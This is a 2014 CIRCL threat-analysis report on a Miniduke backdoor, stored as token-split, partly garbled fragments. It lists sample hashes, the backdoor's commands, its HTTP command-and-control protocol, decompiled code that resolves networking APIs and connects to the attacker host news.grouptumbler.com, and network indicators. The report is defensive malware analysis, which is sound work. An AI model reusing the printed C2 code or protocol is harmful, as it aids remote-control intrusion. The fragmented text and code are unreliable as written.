".", "."], ["4.7", "Execution", "process", ".", ".", ".", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["4", "4", "4", "4", "5", "5", "5", "6", "6", "6", ".", ".", "."], [".", "."], ["."], ["."], [".", "."], [".", "."], ["."], ["handling", ".", ".", ".", ".", ".", "."], ["."], [".", "."], [".", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["8", "8", "8", "9", "9", "10", "6", "Related", "indicators", "information", "6.1", "Network", "infrastructure", ".", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["10", "10", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["5", "Interesting", "code", "parts", "5.1", "Init", "phase", "of", "Sample", "B", ".", ".", ".", ".", ".", "."], ["5.2", "Decrypt", "and", "setup", "registry", "keys", "."], ["5.3", "evaluate", "commands", "(", "extract", ")", "and", "5.4", "Internet", "connect", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["5.5", "Create", "process", "calls", ".", ".", ".", ".", ".", ".", ".", "."], ["Page", "2", "of", "12", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], [".", ".", "."], ["."], [".", "."], ["error", ".", ".", "."], ["."], [".", "."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["."], ["CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "1", "July", "3", ",", "2014"], ["Scope", "of", "work"], ["In", "the", "scope", "of", "targeted", "attacks", "with", "a", "malware", "labeled", "as", "Miniduke", "by", "Kaspersky", "Labs", ",", "CIRCL", "was", "interested", "in", "the", "way", "the", "malware", "\u2019s", "later", "stages", "work", "and", "what", "kind", "of", "interesting", "information"], ["they", "reveal", "(", "e.g.", "techniques", ",", "style", ",", "IOCs", ")", "."], ["No", "public", "analysis", "was", "found", "except", "the", "mention", "in", "Kaspersky", "\u2019s", "report", "of", "a", "custom", "backdoor", ",", "so", "CIRCL", "took", "one", "of", "the", "known", "samples", "and", "started", "this", "analysis", "."], ["2", "Analyzed", "samples", "\u2022", "Sample", "A", "-", "Stage", "3", "sample", "from", "Kaspersky", "reports", "\u2013", "Description"], ["*", "Hash", "found", "in", "Kaspersky", "Lab", "report", "1", "\u2013", "Original", "\ufb01lename", "*", "v1.ex", "_", "\u2013", "Hashes", "*", "MD5", ":", "1e1b0d16a16cf5c7f3a7c053ce78f515"], ["*", "SHA1", ":", "de8e9def2553f4d211cc0b34a3972d9814f156aa", "*", "SHA-256", ":", "a1015f0b99106ae2852d740f366e15c1d5c711f57680a2f04be0283e8310f69e"], ["\u2013", "Filesize", "*", "333824", "Bytes", "(", "326", "KB", ")"], ["\u2013", "Compile", "time"], ["*", "Mon", "Jun", "18", "16:28:11", "2012", "\u2022", "Sample", "B", "-", "Derrived", "from", "Sample", "A", "\u2013", "Description"], ["*", "Dumped", "memory", "region", "0x0D060169", "to", "0x0d08b000", "after", "de", "-", "obfuscation", "and", "UCL", "decompression", "2", "\u2013", "Original", "\ufb01lename", "*", "Extracted", "from", "memory", ",", "no", "\ufb01lename", "\u2013", "Hashes"], ["*", "MD5", ":", "1a2edd2db71fd41e963011da8caf26cc"], ["*", "SHA1", ":", "f344becb220de6\ufb00a4d7223bdb82146d3b1c93ed", "*", "SHA-256", ":", "b61d409b6c1066e0c1fc4fe15f6f367be31fa2cc555cfc0ef7eeb8e5759380c0"], ["\u2013", "Filesize", "*", "175767", "Bytes", "(", "172", "KB", ")"], ["\u2013", "Compile", "time"], ["*", "Mon", "Mar", "5", "14:17:08", "2012", "1", "http://www.securelist.com/en/downloads/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor", "."], ["pdf", "2", "http://www.oberhumer.com/opensource/ucl/", "Page", "3", "of", "12", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "2.1", "July", "3", ",", "2014", "Limitations"], ["This", "work", "has", "been", "done", "with", "utmost", "care", ",", "following", "best", "practices", "in", "software", "reversing", ",", "forensic", "investigations", "and/or", "information", "gathering", "."], ["However", ",", "the", "work", "is", "only", "covering", "small", "aspects", "(", "based", "on", "the", "indicators", "given", ",", "lacking", "full", "context", ")", "and", "not", "an", "exhaustive", "analysis", ",", "and", "hence", "the", "report", "is", "as", "-", "is", ",", "not", "giving", "any", "guarantees", "of", "completeness", "or", "claiming", "absolute", "accuracy", "."], ["2.2"], ["Sharing", "The", "document", "is", "classi\ufb01ed", "as", "TLP", ":", "WHITE", ",", "therefore", "CIRCL", "encourages", "everyone", "to", "share", "this", "analysis", "report", "as", "-", "is", "without", "modi\ufb01cation", "."], ["3", "Executive", "summary"], ["Sample", "B", ",", "contained", "in", "Sample", "A", ",", "can", "be", "categorized", "as", "an", "exhaustive", "backdoor", ",", "implementing", "any", "kind", "of", "functionality", "that", "can", "be", "expected", "for", "this", "kind", "of", "attacks", "."], ["Despite", "the", "fact", "that", "it", "does", "n\u2019t", "implement", "any", "particular", "fancy", "or", "new", "technique", ",", "the", "code", "quality", "appears", "to", "be", "clean", "and", "robust", ",", "making", "rich", "use", "of", "C", "structures", "and", "logging", "and", "it", "shows", "on", "some", "places", "that", "it", "is", "targeting", "organizational", "infrastructures", "rather", "than", "home", "users", "."], ["4", "4.1", "Analysis"], ["Summary", "Sample", "A", "can", "be", "categorized", "as", "a", "container", ",", "obfuscating", "and", "compressing", "the", "real", "payload", "."], ["Sample", "A", "has", "been", "debugged", "until", "Sample", "B", "\u2019s", "decompression", "\ufb01nished", "."], ["The", "memory", "segment", "was", "dumped", "to", "disk", "for", "further", "analysis", "."], ["The", "focus", "of", "the", "analysis", "then", "shifted", "to", "Sample", "B.", "Sample", "B", "is", "identi\ufb01ed", "to", "be", "a", "HTTP", "controlled", "backdoor", ",", "enabling", "the", "attacker", "to", "take", "full", "control", "over", "the", "victim", "computer", "."], ["4.2"], ["Techniques", "used", "The", "analysis", "has", "been", "done", "using", "a", "mixed", "-", "approach", "of", "dynamic", "analysis", "and", "static", "analysis", "in", "order", "to", "overcome", "some", "of", "the", "obfuscation", "and", "encryptions", "used", "by", "the", "malware", "."], ["Some", "of", "the", "techniques", "might", "have", "also", "an", "impact", "on", "the", "interpretation", "of", "the", "malware", "."], ["Unfortunately", ",", "when", "we", "started", "this", "investigation", ",", "the", "domain", "is", "now", "pointing", "to", "an", "IP", "address", "of", "Google", "and", "returning", "a", "404", "Not", "Found", "page", "only", "."], ["An", "interaction", "following", "the", "protocol", "of", "this", "malware", "is", "therefore", "no", "longer", "possible", "."], ["4.3", "Implemented", "commands", "The", "analysis", "of", "Sample", "B", "revealed", "the", "commands", "as", "shown", "in", "table", "1", "Page", "4", "of", "12"], ["CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "mv", "cp", "rm", "pwd", "cd", "rmdir", "mkdir", "pskill", "/", "kill", "exew", "conf", "cdt"], ["dev", "time", "info", "exit", "dir", "/", "ls", "exec", "exeu", "put", "get", "pslist", "/", "ps", "4.4", "July", "3", ",", "2014", "Table", "1", ":", "Implemented", "commands", "move", "a", "\ufb01le", "copy", "a", "\ufb01le", "delete", "a", "\ufb01le", "get", "current", "directory", "change", "current", "directory", "delete", "directory", "create", "directory", "kill", "a", "process", "execute", "command", "show", "backdoor", "con\ufb01guration", "change", "to", "temp", "directory", "get", "a", "list", "of", "device", "drives", "get", "uptime", "of", "machine", "get", "path", "to", "the", "backdoor", ",", "computer", "name", ",", "username", ",", "process", "information", "exit", "get", "the", "content", "of", "a", "directory", "execute", "command", "interactively", "execute", "command", "interactively", "as", "speci\ufb01ed", "domain", "user", "upload", "a", "\ufb01le", "download", "a", "\ufb01le", "get", "a", "list", "of", "running", "processes", "Control", "The", "attacker", "controls", "the", "remote", "computer", "via", "HTTP", "GET", "and", "POST", "requests", "like", "the", "following", ":", "1", "*", "http", ":", "//news", "."], ["grouptumbler", "."], ["com", "/", "news/", "f", "e", "e", "d", ".", "php", "?"], ["i", "=", "Me3tMZEHAuvkc", "~", "uJsO", "~", "W7lX1vSsgkuW99vD3FRgi"], ["The", "request", "is", "encoded", "in", "a", "custom", "BASE64", "encoding", ",", "using", "the", "following", "alphabet", ":", "1", "*", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$~", "4.5", "4.5.1", "IOC", "Network", "The", "malware", "connects", "via", "HTTP", "GET", "and", "POST", "requests", "to", "1", "*", "http", ":", "//news", "."], ["grouptumbler", "."], ["com/", "and", "the", "path", "is", "\ufb01xed", ":", "1", "*", "/news/"], ["f", "e", "e", "d", "."], ["php", "?"], ["i="], ["The", "variable", "part", "is", "the", "custom", "BASE64", "encoded", "string", "corresponding", "to", "\u201d", "i=", "\u201d", "."], ["A", "full", "request", "looks", "like", ":", "1", "*", "http", ":", "//news", "."], ["grouptumbler", "."], ["com", "/", "news/", "f", "e", "e", "d", ".", "php", "?"], ["i={Custom", "BASE64", "}"], ["The", "user", "agent", "is", "always", "Page", "5", "of", "12", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "July", "3", ",", "2014", "1", "*", "Mozilla", "/4.0"], ["Sent", "accept", "headers", "are", ":", "1", "*", "Accept", ":", "4.5.2", "*", "/", "*"], ["Registry"], ["The", "malware", "creates", "in", "1", "*", "HKCU\\", "Software", "\\", "M", "i", "c", "r", "o", "s", "o"], ["f", "t", "\\", "ApplicationManager", "a", "value", "\u2019", "AppID", "\u2019", "with", "the", "data", "it", "calculates", "from", "GetTickcount", "(", ")", ",", "used", "as", "an", "identi\ufb01er", "/", "mutex", "."], ["4.6", "Persistency", "No", "persistency", "mechanisms", "have", "been", "identi\ufb01ed", "."], ["We", "assume", "the", "\ufb01le", "is", "only", "dropped", "and/or", "executed", "on", "request", "via", "stage", "2", "of", "Miniduke", "and", "not", "running", "persistently", "."], ["4.7", "Execution", "process", "."], ["A", "Sample", "UCL", "decompression", "Sample", "B", "Sample", "B", "execution"], ["Update", "on", "Jul", "03", "2014", ":", "F", "-", "Secure", "released", "an", "analysis3", "of", "the", "latest", "MiniDuke", "evolution", ",", "called", "\u201d", "CosmicDuke", "\u201d", ",", "mentioning", "similar", "loaders", "in", "old", "and", "new", "samples", "."], ["That", "\u2019s", "why", "we", "updated", "this", "document", "to", "include", "a", "graph", "of", "the", "loader", ":", "3", "http://www.f-secure.com/static/doc/labs_global/Whitepapers/cosmicduke_whitepaper.pdf", "Page", "6", "of", "12", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "Page", "7", "of", "12", "July", "3", ",", "2014", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "5", "5.1", "July", "3", ",", "2014"], ["Interesting", "code", "parts", "Init", "phase", "of", "Sample", "B", "Decryption", "of", "module", "and", "function", "names", "1", "int", "decode_functions_and_start_internet_loop", "(", ")"], ["2", "{", "3", "wininet", "."], ["d", "l", "l", "=", "decrypt_string(&enc_wininet_dll", ")", ";", "4"], ["hModule", "=", "LoadLibraryA", "(", "wininet", "."], ["d", "l", "l", ")", ";"], ["5"], ["i", "f", "(", "hModule", ")", "6", "{", "7", "lpProcName", "=", "decrypt_string(&enc_InternetOpenA", ")", ";", "8", "InternetOpenA", "="], ["GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "9", "lpProcName", "=", "decrypt_string", "(", "enc_InternetConnectA", ")", ";", "10", "InternetConnectA", "=", "GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "11", "lpProcName", "=", "decrypt_string(&enc_InternetSetOptionA", ")", ";", "12", "InternetSetOptionA", "=", "GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "13", "lpProcName", "=", "decrypt_string(&enc_HttpOpenRequestA", ")", ";", "14", "HttpOpenRequestA", "=", "GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "15", "lpProcName", "=", "decrypt_string(&enc_HttpSendRequestA", ")", ";", "16", "HttpSendRequestA", "=", "GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "17", "lpProcName", "=", "decrypt_string(&enc_HttpQueryInfoA", ")", ";", "18", "HttpQueryInfoA", "=", "GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "19", "lpProcName", "=", "decrypt_string(&enc_InternetReadFile", ")", ";", "20"], ["I", "n", "t", "e", "r", "n", "e", "t", "R", "e", "a", "d", "F", "i", "l", "e", "=", "GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "21", "lpProcName", "=", "decrypt_string(&enc_InternetCloseHandle", ")", ";", "22", "InternetCloseHandle", "=", "GetProcAddress", "(", "hModule", ",", "lpProcName", ")", ";", "23", "port", "=", "parse_int", "(", "\u201d", "80", "\u201d", ")", ";"], ["24", "delay", "=", "parse_int", "(", "\u201d", "61", "\u201d", ")", ";", "25", "generate_identifier_and_setup_jumptable", "(", "&", "i", "n", "s", "t", "a", "n", "c", "e", ")", ";", "26", "interne", "t_l", "oop(&i", "n", "s", "t", "a", "n", "c", "e", ")", ";", "27", "ExitThread", "(", "0", ")", ";", "28", "}", "29", "return", "0", ";", "30", "}", "5.2", "Decrypt", "and", "setup", "registry", "keys", "1", "decrypt_registry_keys_and_set_id", "(", ")", "2", "{", "3", "result", "=", "0", ";", "4", "str_Software_Microsoft_ApplicationManager", "=", "decrypt_string", "(", "&", "enc_Software_Microsoft_ApplicationManager", ")", ";", "5"], ["i", "f", "(", "RegCreateKeyA", "(", "HKEY_CURRENT_USER", ",", "str_Software_Microsoft_ApplicationManager", ",", "&", "hKey", ")", ")"], ["6", "{", "7", "result", "=", "0", ";", "8", "}", "9", "else", "10", "{", "11", "dwType", "=", "4", ";", "12", "cbData", "=", "4", ";", "13", "str_AppID", "=", "decrypt_string(&enc_AppID", ")", ";", "14"], ["i", "f", "(", "(", "RegQueryValueExA", "(", "hKey", ",", "str_AppID", ",", "0", ",", "&", "dwType", ",", "&", "r", "e", "s", "u", "l", "t", ",", "&", "cbData", ")", "|", "|", "dwType", "!"], ["="], ["4", ")", "15", "&", "&", "(", "dwType", "=", "4", ","], ["16", "r", "e", "s", "u", "l", "t", "=", "get_tickcount_based_value"], ["(", ")", ",", "17"], ["RegSetValueExA", "(", "hKey", ",", "str_AppID", ",", "0", ",", "dwType", ",", "&", "r", "e", "s", "u", "l", "t", ",", "4u", ")", ")", ")"], ["Page", "8", "of", "12", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "July", "3", ",", "2014", "18"], ["RegCloseKey"], ["(", "hKey", ")", ";", "19", "else", "20"], ["RegCloseKey"], ["(", "hKey", ")", ";", "21", "}", "22", "return", "r", "e", "s", "u", "l", "t", ";", "23", "}", "5.3", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "evaluate", "commands", "(", "extract", ")", "and", "error", "handling"], ["i", "f", "(", "!"], ["lstrcmpA(&this\u2212>command", ",", "\u201d", "pwd", "\u201d", ")", ")"], ["{", "ret\u2212>return", "=", "\u2212127", ";"], ["i", "f", "(", "!"], ["GetCurrentDirectoryA", "(", "0", "x400u", ",", "&", "ret\u2212>message", ")", ")", "{", "this\u2212>command", "=", "GetLastError", "(", ")", ";", "FormatMessageA", "(", "0", "x1000u", ",", "0", ",", "this\u2212>command", ",", "0", ",", "&", "r", "e", "t\u2212>message", ",", "0x400u", ",", "0", ")", ";", "}", "ret\u2212>l", "e", "n", "+", "=", "l", "s", "t", "r", "l", "e", "n", "A", "(", "&", "re", "t\u2212>message", ")", "+", "1", ";", "}", "5.4", "Internet", "connect", "1", "signed", "int", "_", "_", "t", "hi", "scall"], ["internet_connect", "(", "struct_this_7", "*", "this", ")"], ["2", "{", "3", "b", "u", "f", "f", "e", "r", "=", "10000", ";", "4"], ["i", "f", "(", "u", "r", "l", "[", "0", "]", "!"], ["=", "\u2019", "*", "\u2019", "|", "|", "u", "r", "l", "[", "1", "]", "!", "=", "\u2019", ".", "\u2019", ")", "5", "lstrcpyA(&host", ",", "\u201d", "news", "."], ["grouptumbler", ".", "com", "\u201d", ")", ";", "6", "else", "7"], ["wnsprintfA(&host", ",", "256", ",", "\u201d", "%", "x%s", "\u201d", ",", "*", "&", "this\u2212>path", ",", "0x409001", ")", ";", "8"], ["use_proxy", "=", "0", ";", "9", "buffer", "=", "3", ";", "10", "this\u2212>hInternetOpen", "=", "InternetOpenA", "(", "\u201d", "M", "o", "z", "i", "l", "l", "a", "/", "4", ".", "0", "\u201d", ",", "0", ",", "0", ",", "0", ",", "0", ")", ";", "11"], ["i", "f", "(", "this\u2212>hInternetOpen", ")", "12", "{", "13"], ["i", "f", "(", "use_proxy", ")"], ["14", "{", "15", "s", "u", "c", "c", "e", "s", "s", "_", "s", "e", "t", "o", "p", "t", "i", "o", "n", "=", "InternetSetOptionA", "(", "this\u2212>hInternetOpen", ",", "INTERNET_OPTION_PROXY", ",", "&", "b", "u", "f", "f", "e", "r", ",", "12", ")", ";", "16"], ["i", "f", "(", "!", "success_setoption", ")"], ["17", "{", "18", "InternetCloseHandle", "(", "this\u2212>hInternetOpen", ")", ";", "19", "return", "0", ";", "20", "}", "21", "}", "22"], ["InternetSetOptionA"], ["(", "this\u2212>hInternetOpen", ",", "INTERNET_OPTION_CONNECT_TIMEOUT", ",", "&", "b", "u", "f", "f", "e", "r", ",", "4", ")", ";", "23"], ["InternetSetOptionA", "(", "this\u2212>hInternetOpen", ",", "INTERNET_OPTION_RECEIVE_TIMEOUT", ",", "&", "b", "u", "f", "f", "e", "r", ",", "4", ")", ";"], ["24", "s", "u", "c", "c", "e", "s", "s", "_", "s", "e", "t", "o", "p", "t", "i", "o", "n", "=", "InternetSetOptionA", "(", "this\u2212>hInternetOpen", ",", "INTERNET_OPTION_CONTROL_SEND_TIMEOUT", ",", "&", "b", "u", "f", "f", "e", "r", ",", "4", ")", ";", "25", "LOWORD", "(", "s", "u", "c", "c", "e", "s", "s", "_", "s", "e", "t", "o", "p", "t", "i", "o", "n", ")", "=", "port", ";", "26", "this\u2212>hSession", "=", "InternetConnectA", "(", "this\u2212>hInternetOpen", ",", "&", "host", ",", "s", "ucc", "ess", "_", "se", "top", "tio", "n", ",", "0", ",", "0", ",", "INTERNET_SERVICE_HTTP", ",", "0", ",", "0", ")", ";", "27"], ["i", "f", "(", "this\u2212>hSession", ")"], ["28", "return", "1", ";"], ["29", "InternetCloseHandle", "(", "this\u2212>hInternetOpen", ")", ";", "30", "}", "Page", "9", "of", "12", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE"], ["41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "July", "3", ",", "2014", "31", "return", "0", ";", "32", "}", "5.5", "Create", "process", "calls", "Command", "\u201d", "exec", "\u201d", "-", "standard", "process", "creation", ":", "1", "hProcess", "=", "CreateProcessA", "(", "2", "0", ",", "&", "this\u2212>cmdline", ",", "0", ",", "0", ",", "3", "1", ",", "0x14u", ",", "0", ",", "0", ",", "4", "&", "this\u2212>startupinfo_a", ",", "&", "this\u2212>process_information", ")", "Command", "\u201d", "exeu", "\u201d", "-", "process", "creation", "in", "a", "domain", "environment", "1", "2", "3", "4", "hProcess", "=", "CreateProcessWithLogonW", "(", "&", "Username", ",", "&", "Domain", ",", "lpPassword", ",", "0", ",", "0", ",", "&", "CommandLine", ",", "4u", ",", "0", ",", "&", "CurrentDirectory", ",", "&", "this\u2212>startupinfo_b", ",", "&", "this\u2212>process_information", ")", "6", "Related", "indicators", "information", "6.1", "Network", "infrastructure"], ["The", "domain", "news.grouptumbler.com", "is", "currently", "resolving", "to", "173.194.70.101", "1", "f", "i", "r", "s", "t", "seen", "2013\u221203\u221203", "0", "1", ":", "5", "7", ":", "3", "7", "\u22120000", "2", "l", "a", "s", "t", "seen", "2013\u221203\u221206", "2", "3", ":", "3", "4", ":", "4", "7", "\u22120000", "3", "news", "."], ["grouptumbler", "."], ["com", "."], ["A", "1", "7", "3", "."], ["1", "9", "4", "."], ["7", "0", "."], ["1", "0", "1", "Before", "that", "date", ",", "the", "IP", "was", "200.63.46.33", "1", "f", "i", "r", "s", "t", "seen", "2012\u221203\u221214", "1", "4", ":", "2", "1", ":", "1", "0", "\u22120000", "2", "l", "a", "s", "t", "seen", "2013\u221202\u221226", "2", "2", ":", "0", "4", ":", "0", "7", "\u22120000", "3", "news", "."], ["grouptumbler", "."], ["com", "."], ["A", "2", "0", "0", "."], ["6", "3", "."], ["4", "6", ".", "2", "3", "The", "IP", "200.63.46.33", "was", "hosting", "the", "following", "domains", ":", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"], ["17", "18", "19", "dvdform", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "dvdform", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "p90xprice", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "d", "e", "x", "t", "e", "r", "s", "e", "a", "s", "o", "n", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "d", "e", "x", "t", "e", "r", "s", "e", "a", "s", "o", "n", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "news", ".", "grouptumbler", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "babylearningdvd", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "t", "u", "r", "b", "o", "f", "i", "r", "e", "c", "o", "u", "p", "o", "n", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "t", "u", "r", "b", "o", "f", "i", "r", "e", "c", "o", "u", "p", "o", "n", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "s", "m", "a", "l", "l", "v", "i", "l", "l", "e", "d", "v", "d", "s", "e", "t", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "s", "m", "a", "l", "l", "v", "i", "l", "l", "e", "d", "v", "d", "s", "e", "t", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "miamivicedvdboxset", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "miamivicedvdboxset", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "sexandthecityondvd", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "sherlockholmesondvd", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "t", "r", "x", "f", "o", "r", "c", "e", "k", "i", "t", "o", "r", "i", "g", "i", "n", "a", "l", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "t", "r", "x", "f", "o", "r", "c", "e", "k", "i", "t", "o", "r", "i", "g", "i", "n", "a", "l", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "weddingdressestoday", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "www", ".", "maxheadroomdvdseries", ".", "com", "."], ["A", "2", "0", "0", ".", "6", "3", ".", "4", "6", ".", "2", "3", "Page", "10", "of", "12", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "July", "3", ",", "2014"], ["None", ",", "some", "or", "all", "domains", "in", "this", "list", "might", "be", "malicious", "as", "well", "."], ["The", "IP", "address", "200.63.46.33", "is", "currently", "anounced", "by", "Panamaserver.com", "1", "20120426", "20130311", "52284", "2", "0", "0", "."], 